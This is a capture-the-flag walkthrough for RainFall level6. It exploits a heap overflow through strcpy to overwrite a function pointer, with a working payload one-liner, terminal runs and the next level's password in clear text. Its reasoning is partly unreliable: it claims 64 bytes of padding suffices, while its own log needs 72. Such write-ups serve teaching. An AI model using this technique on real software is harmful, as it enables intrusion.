LEVEL_6:
# 📚 Exploiting `level6` – overwrite the function pointer

## ✅ Step 1: Understand what you need to overflow

You're trying to overwrite the function pointer stored in the second malloc'd block (`heap2`), which is written with:

```asm
mov $0x8048468, %edx     ; address of m()
mov 0x18(%esp), %eax     ; heap2
mov %edx, (%eax)         ; *heap2 = m
```

You control the data written into `heap1` via:

```c
strcpy(heap1, argv[1])
```

So:

* `heap1 = malloc(0x40)`
* `heap2 = malloc(0x4)`
* `*heap2 = &m`
* Then `strcpy(heap1, argv[1])`

That means you need to:

* Write 64 bytes (0x40) to fill `heap1`
* Then **4 more bytes** to overwrite the function pointer in `heap2`

---

## ✅ Step 2: Confirm address of `n()` function

From your GDB output:

```asm
Dump of assembler code for function n:
0x08048454 <+0>: ...
```

So, address of `n()` is:

```
0x08048454
```

---

## ✅ Step 3: Craft the payload

In Python:

```bash
python -c 'print("A"*64 + "\x54\x84\x04\x08")'
```

---

## ✅ Step 4: Run the program with the payload

**Important:** the program is calling `strcpy(argv[1])`, not reading from stdin — so you must pass the payload as an argument:

```bash
level6@RainFall:~$ ./level6 $(python -c 'print("A"*64 + "\x54\x84\x04\x08")')
Nope
level6@RainFall:~$ ./level6 $(python -c 'print("A"*68 + "\x54\x84\x04\x08")')
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6 $(python -c 'print("A"*72 + "\x54\x84\x04\x08")')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
level6@RainFall:~$ su level7
password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
level7@RainFall:~$
```

This should cause:

* input overflows `heap1`
* Overwrites the pointer in `heap2` with `0x08048454` (address of `n`)
* When `main()` executes `call *eax`, it will actually call `n()`, which runs `system("/bin/sh")`

---